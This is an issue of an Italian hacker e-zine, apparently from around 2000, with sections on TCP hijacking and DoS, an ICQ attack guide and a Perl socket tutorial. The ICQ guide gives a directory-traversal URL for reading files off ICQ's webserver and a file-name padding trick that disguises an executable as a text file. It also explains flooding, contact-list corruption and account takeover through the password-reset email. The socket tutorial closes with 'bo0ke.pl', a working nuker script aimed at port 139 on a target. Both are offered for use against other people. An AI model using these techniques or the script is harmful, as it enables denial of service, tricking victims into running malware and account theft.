----[ 3.4 ]----[ Hijacking. ]

L'hijacking e' un metodo con il quale un host compreso tra il traffico
di dati di altre due macchine , puo' , tramite sniffing e generazione 
di pacchetti, fingersi uno dei due host tra i quali sta in mezzo e
bypassare le eventuali protezioni dell'altro host.

Dati 3 host:

A - inzuppa
B - il_biscotto
C - nel_latte

Mettiamo il caso che B  si trovi al centro del flusso di dati che passa 
tra A e C. Sara' possibile per B [ se dotato di uno sniffer e di un 
generatore di pacchetti ] captare e redirezionare i pacchetti che attinge
da A e bypassare le eventuali protezioni di C. [ password etc.. ]

[ A.inzuppa ] -------> [ B.il_biscotto ] -------> [ C.nel_latte ]

Questo e' possibile perche' B conosce il sequence number dei pacchetti di
A. Conoscendoli puo' sostituirsi in qualunque momento ad A, e interagire
con C , come se fosse A.

----[ 3.5 ]----[ DoS ]

Dos Sta per "Denial Of Service" Attack. Sono attacchi che di solito non
mirano all'accesso del sistema, ma ad un suo temporaneo tilt o crash. 
Lo si potrebbe voler fare per svariati motivi, ma il perche' fare o non
fare certe cose va oltre lo scopo di questo documento :P
I DoS di solito mirano a precisi servizi, e possono, a seconda del caso,
far occupare aree di memoria, restringere la banda, o comunque mettere in
difficolta' un server con migliaia di richieste in poco tempo, in modo che
questo non riesca a gestirle e vada in crash. [ vedi ultimi attacchi
Amazon, Yahoo! etc etc... ]

Un tipico esempio e' il SYN flood attack. 
Il flag SYN e' il primo della serie SYN, SYN-ACK, ACK che serve per 
stabilire una connessione TCP [ Treeway handshake ], e dice in pratica 
al server in ascolto che sta per iniziare una connessione. Il server cosi'
alloca delle risorse per poter continuare questa connessione.
Il SYN flood manda solo pacchetti con flag SYN in modo che il server
allochi cosi' tante risorse da non poter piu' negoziare con nessun altro. 
Nella peggiore delle ipotesi infatti la banda si restringe a tal punto che
nessuno e' piu' capace di connettersi al server in questione.

Altro classico DoS e' lo smurf di Tfreak.
Lo smurf manda degli ICMP_ECHO_REQUEST a svariati server [ detti broadcast
], con ip spoofato ,quello della vittima, in modo che questi server
rispondano contemporaneamente con degli ICMP_ECHO_REPLY ...risponderanno
cosi' tutti insieme , ma alla povera vittima, che sara' sommersa da
questi pacchetti.

Molti DoS usano altri server come "amplificatori", per i loro scopi.
Inoltre fanno anche un massiccio uso dello spoofing, che serve se non
altro per non farsi sgamare :)
I DoS infatti sono alla portata di molti e richiedono poche risorse per
essere messi in funzione.

DoS include DDoS [ Distributed Denial of Service ]. Stavolta i server sono
settati con dei demoni ad hoc in ascolto, pronti a mandare pacchetti allo
scattare di un semplice comando [ trinoo e simili ].

Tutto questo sarebbe sicuramente diverso se lo Spoofing non fosse
possibile. Buona parte degli attacchi non sarebbe mai andata a termine se
non fosse stato possibile maneggiare gli header IP.

--------------------------------------------------------------------------

Bibliografia:

Introduction to the Internet Protocols - Charles  L. Hedrick.
The Linux Network Administrators' Guide - Olaf Kirch
Internet Protocol Frequently Asked Questions
RFC 791 - 793

Per DoS vari: www.technotronic.com
---[ Altre info sul TCP/IP:

ftp.netcom.com:/pub/gnn/tcp-ip.faq 

Internetworking with TCP/IP Volume I
(Principles, Protocols, and Architecture)
Douglas E. Comer
Prentice Hall 1991 ISBN 0-13-468505-9

Internetworking with TCP/IP Volume II
(Design, Implementation, and Internals)
Douglas E. Comer / David L. Stevens
Prentice Hall 1991  ISBN 0-13-472242-6

Internetworking with TCP/IP Volume III (BSD Socket Version)
(Client - Server Programming and Applications)
Douglas E. Comer / David L. Stevens
Prentice Hall 1993  ISBN 0-13-474222-2

TCP/IP Illustrated, Volume 1: The Protocols,
W. Richard Stevens
(c) Addison-Wesley, 1994  ISBN 0-201-63346-9

"TCP/IP Illustrated, Volume 2: The Implementation",
by Gary R. Wright and W. Richard Stevens
(c) Addison-Wesley, 1995
ISBN 0-201-63354-X

Unix Network Programming
W. Richard Stevens
Prentice Hall 1990  ISBN 0-13-949876

[############################################################################]

          ==========================================================
                               P3r L4 S3R13 :

                "3 1L N4V1G4R M'3' D0LC3 1N QU3ST4 R3T3..... "

                         "ICQ, DI TUTTO DI PIU'"
          ==========================================================

         
=0=) Contenuti (=0=
=1=) Cos'e' ICQ?
=2=) Perche' ICQ e' cosi' insicuro?
=3=) I crack
=4=) Flooding
=5=) Spoofing
=6=) Peculiarita' dell'homepage di ICQ 
=7=) Trasferimento dei file in ICQ
=8=) Mostra gli utenti invisibili
=9=) Scova le password
=n=) Note Finali (=n=
=A=) Appendicite A: Prendere la porta di ICQ
=B=) Appendicite B: I vantaggi dei cloni ICQ ssotto Unix
=C=) Appendicite C: Converti l'IP in UIN da solo
=D=) Appendicite D: Divertiamoci con la lista dei contatti
=E=) Appendicite E: Un segreto incredibile con il protocollo ICQ


=1=) Cos'e' ICQ?

Per quei pochi intenditori che non lo sanno, e' un programma di messageria
istantanea, anzi forse e' il miglior programma di chat.
Per potervelo scaricare potete andare su www.che.it, ehm, volevo dire
www.icq.com. Esso puo' essere eseguito sia su piattaforma Win (e che roba e')
che su piattaforma Unix.

=2=) Come mai e' cosi' insicuro?

ICQ puo' essere anche un buon programma e un servizio innovativo, ma presenta
qualche pecca che (forse) lo rende anche un programma molto insicuro.
Sulla base di questo vediamo alcuni motivi che mi hanno spinto a dir cio':

A) Il client svolge troppe operazioni
B) I programmatori sono delle persone disattente e che mirano piu' alla
   flessibilita' che alla sicurezza.

Spiegamoci meglio!
Le operazioni dal lato client rendono ICQ molto vulnerabile per vari motivi.
Per esempio prendiamo lo spoofing dei messaggi. E' possibile inviare messaggi
ad un utente, mascherando l'indirizzo del mittente.
Alcune persone decidono di dire al loro client chi sia il destinatario del
messaggio, mentre altre preferiscono inviare il loro messaggio attraverso
il server, cosi'ICQ ricevera' il messaggio da ognuno, non solo dal server.
Se tutti i messaggi vengono inviati attraverso il server ICQ non si potranno
ricevere messaggi da ognuno ma solo dal server, e questo rende possibile lo
spoofing.
Ora parliamo del cracking. Esistono crack per ICQ di tutti i generi. Pero'
non sempre e' possibile utilizzare un crack quando i messaggi vengono inviati
attraverso il server.
Per esempio prendiamo quello che mostra gli IP.
ICQ necessita di conoscere gli indirizzi IP delle altre persone per inviare
loro gli eventi. Se la spedizione di questi eventi era possibile solo
attraverso il server, il vostro client avrebbe dovuto contattare il server
e far in modo che sia lui a spedire gli eventi ai giusti destinatari.
D'altro canto il server conosce gli IP di tutte le persone, e spedira i msg
per voi. Quindi senza il crack, l'unico modo per rivelare l'IP di una persona
e' avere accesso diretto al server.
La realizzazione di ICQ da parte dei programmatori, non e' stata certo facile.
Ma si rimprovera loro di non aver dato, durante la programmazione, un occhio
di riguardo alla sicurezza, creando un servizio innovativo e efficiente da un
lato, dall'altro abbiamo un prog che e' subito stato oggetto di ricerca da
parte di smanettoni ;)


=3=) I crack (da non confondere con il crack altrimenti T0rment0 si incazza)


Sappiamo benissimo cosa sono i crack, i cheat e i trainer.
Quelli di ICQ permettono:

A) Di vedere gli indirizzi IP dei poveracci che hanno abilitato l'opzione
   'Don't show IP address' credendo di aver scoperto un nuovo modo di spoofare.
B) Aggiungere qualcuno alla vostra lista dei contatti senza autorizzazione
C) Eseguire piu'ICQ nello stesso tempo con la possibilita di UIN differenti.
D) Aggiungervi da soli alla lista dei vostri contatti (serve, certo che server)

Un pacchetto di crack disponibili dalla rete li trovate all'URL:
ttp://thor.prohosting.com/~bornic. 


=4=) Flooding

Ci sono diversi metodi per floodare qualcuno:


A) Il primo modo per farlo e' cliccare due volte sul nome di qualcuno
nella lista dei contatti, scrivere un messaggio, copiarlo,
incollarlo ed inviarlo, poi incollarlo ed inviarlo....fino a quando non vi
accorgerete che quello che state facendo non serve a nulla!
 
B) Usare un flooder "in scatola" (questi tipi di programmi sono anche
chiamati "in scatola", perche' sono come il cibo in una scatola - tutto
quello da fare e' aprire la scatola e mangiare. Quindi sono utili solo se
siete dei cattivi cuochi...;) Questi flooders sono stati programmati da
persone che hanno appreso il protocollo ICQ da soli, sia studiandosi ogni
singolo blocco che mettendo in ascolto sul loro pc un server ICQ e
sperimentando. Ci sono alcuni server che spoofano l'UIN ed inviano vari 
messaggi alla vittima da UIN diversi. Potete prendere un buon flooder su
www.warforge.com ma dopo sarete solo dei buoni script kiddies. Avrete bisogno
delle porte aperte su cui opera ICQ. Esse di solito vanno dalla 1024 alla 2000.
Tutto quello che dovrete fare e' scannerizzare questo range di porte.
Se vorrete difendervi, vi basta aprire molte di queste porte in modo da
indurre l'attaccante a confondersi.

C) ICQ ha anche un'opzione chiamata Email Express. Come ben saprete, il
vostro UIN e' anche un'email se ci aggiungiamo @icq.com dopo. Quindi un
altro modo per floodare e' anche usare un mailbomber.

Per proteggervi da queste cose, basta disabilitare l'Email Express dal
menu delle preferenze in ICQ. Non dimenticatevi che il vostro IP e la
vostra Email saranno visibili dal vostro target.
Se state sotto flood, ci sono programmi di protezione che cancellano i
messaggi in arrivo e che vi chiudono il client.

=5=) Spoofing

Spoofing....ohhh! Che parolone! Vabbe' ci stanno quelli che usano i socks
e dicono che stanno praticando spoofing, perche' non possiamo dirlo anche
noi? 
I messaggi spoofati e gli altri eventi, o la creazione di programmi che
fanno cio', sono possibili imparandovi il protocollo ICQ.
Il miglior spoofer e' il Lame Toy.
Attraverso questi tools, non solo e' possibile spoofare gli indirizzi dei
msg ma anche eventuali richieste di chat o di sending. 
Se inviate un messaggio a qualcuno con il suo ip e lo aggiungete alla sua
lista dei contatti, la prossima volta che egli eseguira' il suo client ICQ
perdera' l'intera lista dei contatti. Questa viene anche chiamata 'DB
Corruption'. Per verdere la sua ira dal vivo, basta che lo attaccate con
un DoS e sentirete le bestemmie fino al cielo :)
Vi consiglio di salvare periodicamente la vostra lista dei contatti e di
scaricarvi un crack che vi permette di aggiungervi da soli alla contact
list.

=6=) Peculiarita' dell'homepage di ICQ

ICQ a partire dalla versione ICQ99a ha una nuova opzione. Essa permette di
aprire un piccolo webserver sul vostro pc e di inserire un sito online.
Attraverso questo sistema, ogni utente puo' condividere numerosi files
Il sito e' online solo quando si e' collegati, quindi gli utenti con una
linea dedicata permettono 24 ore su 24 di accedere alla loro homepage.
E ora una domanda da un milione di dollari: e' sicuro questo webserver?
L'homepage del webserver di ICQ e' vulnerabile a due attacchi stupidissimi.

A) Quando vi connettete ad esso manualmente (con un prog tipo telnet,
netcat, etc) ed entrate nei comandi non standard del server web, e'
possibile prendere qualsiasi file e, eventualmente, crashare il client
target. Es. se vogliamo prendere il file merda.jpg dal sito
www.leganord.it basta che ci connettiamo al sito leganord.it alla porta 80
e che digitiamo il comando "GET merda.jpg" (senza gli apici).
Se invece digitate solo GET, il server web crasha, o nelle nuove
versioni, da' un msg "Connection lost"...mah!

B) La directory di default del web di ICQ e' c:\program files\icq\homepage\ .
Ogni cosa qui presente, puo' essere letta da ogni browser. Ma se avete
l'opzione "Climb up" abilitata? Essa permette di aggiungere dei punti dopo
l'url per tornare indietro. Spiegamoci meglio! Conoscete il comando cd ..?
Ehm, allora i due punti che seguono indicano "Me vedi ora? Embe' me voglio
trasporta dentro a 'na directory precedente!", indicandone 4 allora dovremmo
essere nella root di winzozz? Indovinato! Questo funziona con ICQ99a #1700
e #1701. Per esempio per leggere il file system.ini basta che mettiamo il
seguente url: "/..../.html/windows/system.ini". Perche' ho messo ".html"?
Ah gia'! Siccome il webserver di ICQ e' stato programmato na 'zoza, basta
aggiungere il comando ".html" per vedere qualsiasi file!
Potete anche destreggiarvi con un downloader tipo wget, visto che questo
webserver permette anche il resume. Vi ricordo che questo non e' piu'
possibile con le nuove versioni di ICQ.

=7=) Trasferimento dei file in ICQ

Quando ricevete una richiesta di trasferimento file da qualcuno, potete vedere
il nome del file in una piccola finestra. Ma cosa succede se il nome del file
e' troppo lungo per essere mostrato? Facciamo un esperimento. Prendete un file
qualsiasi, es. "Loveyou.exe"(ahahah) (Senza gli apici! ahahah!) e rinominatelo
in questo modo: "Loveyou.txt                                    .exe" . Quando
lo invierete a qualcuno, nella finestra apparira' solo Loveyou.txt, e il
povero ingenuo aprira ed eseguira' il file senza sapere a cosa va incontro!
Per un effetto migliore cambiare l'icona del vostro eseguibile nell'icona
che usa il vostro OS per distinguere quel file che vorrete fargli credere
che sia.

=8=) Mostra gli utenti invisiili

ICQ ha un'opzione chiamata "Invisible list". Ognuno su questa lista non potra'
vedere se sei online o offline, anche se lui ti ha inserito nella sua contact
list. Se qualcuno e' invisible e voi volete vedere se in quel momento e'
collegato, vi basta fare le seguenti cose:

(a) Trovare il suo UIN (es. UIN, 0292929).
(b) Andate su www.icq.com/0292929
(c) Vedete se e' online o offline attraverso una piccola immmagine.
Cos'e' questo? E' mio, e' mio, no e' mio! Questa opzione permette anche agli
utenti che non hanno ICQ di vedere se qualcuno e' online o no.
Questa opzione e' impostabile nel menu "Preferences" Quando qualcuno la
disabilita, appare scritto "Disabled".

=9=) Scova le password

Se per qualche losco motivo, riuscite a prendere il file DataBase di qualcuno,
la pass e' vostra! Infatti essa non viene crittata, ed e' presente li' in
bella mostra! Ancora, alcune persone scrivono un falso indirizzo e-mail al
momento della registrazione. Se per esempio trovate l'email nel file DB
come questa "teng@nu.problem.it", andate su nu.problem.it (non esiste!) e
registratevi con quella e-mail. Poi andate su www.icq.com e entrate nella
schermata "forgot your password?". Inserite l'UIN della vostra vittima, e la
password sara' spedita al 'suo' indirizzo e-mail ! :)
Cmq, come ben sapete la pass di ICQ puo' essere lunga max 8 caratteri.
Nel 1997 alcuni utenti di Linux si sono divertiti parecchio, entrando con
un nome non loro e senza pass! Ora vi spiego: dopo aver inserito l'user di
cui volevano appropriarsi, inserivano una pass piu' lunga di 8 caratteri,
e il server per motivi di overflowing, dava l'accesso! I client per Linux
di allora, erano solo dei cloni, visto che la Mirabilis si era rifiutata di
fare un client per Linux. Linuxiani: "Mo' ce pensiamo noi!"
Purtroppo ora non esiste piu'! :(


=n=) Note finali (=n=

Lo faccio o non lo faccio?
--------------------------
Le persone hanno paura di tutto! Eccovi alcune frasi:

<minghia> Mii! Io irc non lo usai per paura che mi fanno i DoS!
<ErCipolla> Mbi' coglioni! Ma o' sai che me stanno a fa mailbombing ?
<Terun> Nun c'ha facc chiu! So trasut ncopp a nu sit che m'ha bloccat u
        winzozz!
<Gnari> Ah bischero! Dopo averne lette tante de ste cose, mi sa tanto che
        torno a gioca' col paroliere!

Allora, voglio mettere i puntini sulle I : ...
Chiunque ha paura di stare su internet, si dia all'ippica!
Ho detto cio' perche' come sulla rete esistono gli attacchi, nello stesso modo
esistono anche le protezioni e le contromisure adatte.
Ecco 3 regole:
1) Acquisire conoscenze e competenze adatte
2) Non aver mai paura di nessuno
3) Nel caso piu' grave o chiudere il collegamento o segnarsi l'ip, fare un
   whois e denunciarlo al provider (soluzione drasticissima!)

ICQ sotto Linux
---------------
Esistono le versioni ufficiali di ICQ per quasi tutte le piattaforme,
e per Linux ? Mistero!
Non si sa per quale misero motivo, la Mirabilis si sia rifiutata di creare un
client per Linux. Mah! Avra' forse paura di creare un client, 10000 mila
volte piu' disastroso di quello per win ? D'altronde attraverso l'opensource
da Linux non dovrebbe essere un problema. Mah!
Cmq ne esistono tanti di cloni di client ICQ per Linux; male che vada vi
installate la JVM (Java Virtual Machine) e fate partire la versione in Java
di ICQ.

=A=) Appendicite A: Prendere la porta di ICQ

Si, possiamo ricavarci noi la porta di ICQ! Come? Vi ricordate il metodo
per ricavarci l'IP su ICQ ? Bene, si deve usare lo stesso procedimento.
Una volta trovato l'IP, potete anche vedere la porta. Infatti Netstat
mostra sia la porta locale e la porta remota, quindi attraverso un
semplice programmillo, come lo stesso netstat, rivacarci la porta e' un
gioco da ragazzi (perche'? siamo adulti?) Guardate anche la sezione B.

=B=) Appendicite B: I vantaggi dei cloni Unix

Anche se i cloni di ICQ hanno meno opzioni delle versioni ufficiali di
ICQ, possono avere delle feature piu' carine: come per esempio il menu che
aggiorna tutta la vostra lista dei contatti, un pulsante che serve a
connettersi ad un altro server in caso che quello predefinito sia
occupato. Alcuni, invece, mostrano direttamente l'ip e la porta nella page
delle info, cosi' possiamo aggiungere persone alla contact list senza la
loro autorizzazione. Altri invece hanno dei spoofatori di messaggi...

=C=) Appendicite C: IP ==> UIN convertiamocelo noi
 
Supponiamo che qualcuno stia cercando di nukkarvi. Il vostro firewall
blocca l'attacco ed a questo punto volete chattare con l'idiota per
insultarlo profondamente. Avete il suo IP? No problem! Se questo tizio ha
ICQ, potrete trarre il suo UIN facilmente! Questo trucchetto e' molto
facile da attuare. Allora, prendiamo un 'message spoofer' e mandiamo un
messaggio al cleptomane inserendo il suo IP nel programma e mettendo come
UIN sorgente il vostro UIN. Mi raccomando nel body inserite qualche frase
o domanda a cui deve corrispondere una risposta; per esempio: "Ti
interessa sapere come ricavare l'user e la pass di un utente Wind ?". A
questo punto, a meno che non abbiate preso proprio uno che abbia gia' un
abbonamento a Wind, ottenete la risposta. Ops...quello e' il suo UIN!

=D=) Appendicite D: Divertiamoci con la lista dei contatti

Come ho gia' detto se aggiungete qualcuno alla sua contact list, egli
perdera' tutta la sua lista dei contatti, a meno che non abbia la patch!
C'e' un altro modo per far questo. Se avete la persona nella vostra
contact list, cambiate il suo nome e spediteglielo. Se questa persona
possiede un cervello come il vostro, lo accettera' ed a questo punto siamo
a cavallo! Per difendervi basta che installiate la patch adeguata!.

=E=) Appendicite E: Protocollo ICQ e cosa si puo' fare

Se vi studiate il protocollo di ICQ, avrete in mano un'arma potente.
Infatti tutti i programmi citati in questo tutorial ve li potrete
costruire da soli e, a quel punto, diventerete finalmente dei super eroi
(Sa...sa...sasamen! ndSasa)
Con affetto il vostro Und3rk00l vi lascia con modestia, lasciando un
messaggio aperto ai membri dei BT:

"Checazz! Ma e' mai possibile che un'ezine esca dopo 7 mesi?"
"Cosa mi dite? Avrei dovuto scrivere piu' articoli in questo periodo?"
"Ehm.....fiuiufiufiufiufiufiufiufiufiufiufiufiufiufiufiufiufiufiufiu!"
	
				        			Und3rk00l	

[############################################################################]

-----------------[ cIUCCIATEVI iL s0CKET - sUCK y0UR s0CKET ]------------------
----------------[ sEMPLICE pROGRAMMAZIONE dEI s0CKET iN pERL ]-----------------

Ok, ormai vi sarete rotti le palle dei socket, tutti ne parlano, tutti li 
vogliono, tutti li usano ...
<X>: Caro, prendi l'ombrello che oggi piovono socket!
<Y>: Cazzo, ieri per poco non investivo un socket!
<Z>: Tengo un socket grosso cosi'! :P [ Questa l'ha detta Rocco Siffredi nel 
suo ultimo film "Montami nel Socket" di recente uscita ]
I socket servono a stabilire connessioni basate sul TCP/IP. Un socket "client"
si connette ad un altro socket "server" per scambiare dati, informazioni. 
E' facile usare i socket con un linguaggio "potabile" come il perl, ecco 
come :

[###########################################################################]

#!/usr/bin/perl

# [ questo crea una connessione in locale sulla porta 23 e ne mostra
# l'output ] 

use IO::Socket;

$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"127.0.0.1",
PeerPort=>"23") or die "S0rrY, UnabLe T0 CreaTE SockET\n";
print $crud=<$socket>;
close $socket;

# Se avete abilitato il telnet dovrebbe apparirvi qualcosa del tipo :
# Wellcome to Red Hat 6.2 o simili....

[###########################################################################]

dove:
                                                       
PeerAddr - Indirizzo dell'host remoto                           
PeerPort - Porta dell'host remoto                                              
LocalAddr - Indirizzo dell'host locale                                      
LocalPort - indovinate?                                  
Proto - Protocollo da usare (TCP, UDP..)                                     
Type - Tipo di Socket (SOCK_STREAM, SOCK_DGRAM..)                            
Listen - Attende in ascolto                                           
Timeout - Valore di Timeout per varie operaziooni            

[###########################################################################]

# [ questo invece mette in ascolto un server sulla porta 12345
# e mostra come output, l'input del client. E' bello guardare cosa
# scrive l'Homo Netbus :) ]

use IO::Socket;

$socket = IO::Socket::INET->new(Proto=>"tcp", LocalPort=>"12345",
Listen=>"1");
$connection = $socket->accept;

# Aspetta quindi per un input e quando lo trova lo stampa
 while (<$connection>)
{
         print
}
 close $socket, $connection;

# Il programma continuera' finche' non lo fermerete voi [ ^C , kill ]
(END)

Ora voi potreste anche obiettare: "a che cazzo serve tutto questo?
se volevo aprire qualche socket usavo netcat che e' pure piu' bellino"
Allora io vi rispondero': scusate, ma allora che caXXo la leggete a fare
questa e-zine? :P Le potenzialita' sono infinite, l'unico limite e' alla 
vostra fantasia. Ecco un esempio:

bo0ke.pl...............[snip]..............
 
#!/usr/bin/perl

use IO::Socket;

# bo0ke.pl [bo0zed Nuker], a vERY lAME sCRIPT ,aS lAME aS HiS fATHER.
# by nEMBO[K] ,0NLy for X-Brain :P

print "------------------[ bo0ke - Bo0Zed Nuker ]-------------------\n";
print "tHIS sCRIPT tRY t0 sEND sHIT t0 p0RT 139 0N A wINDOWS mACHINE\n";
print "-----[ tHIS sCRIPT iS lAME , s0 d0N'T mAIL mE 4 tHIS =)]-----\n\n";
if ($#ARGV != 0) {
        die "---[ dEVI dARE uN iP o uN h0STNAME pRIMA\n"
}

opensocket ("\n");
print $remote 
"B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\
T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\
B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\
T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\
B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\
T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\
B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\
T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\
B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\
T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\
B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\
T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\
B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\
T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\
B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\
T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\
B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\
T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS\B00ZED\T0XINS";
close $remote;
die "---[ wELL d0NE, sHIT sENDED\n";

sub opensocket {
        $remote = IO::Socket::INET->new (
                Proto => "tcp",
                PeerAddr => $ARGV[0],
                PeerPort => "139",          
        ) || die "---[ eRR0R,tRY aGAIN\n"; 
        $remote->autoflush(1)
}

bo0ke.pl...............[snip]..............

                                                                nEMBO[K]

[################################] OutrO [###################################]

Siamo arrivati alla fine di questo secondo numero e, da come avrete notato,
all'appello tra i membri manca una persona: Techno[k]. Ci ha promesso che nel
prox num. ci rinfreschera' con una serie di programmini 4 linux niente male..
:) Mi raccomando non cambiate canale.......
[################################] EoF [#####################################]
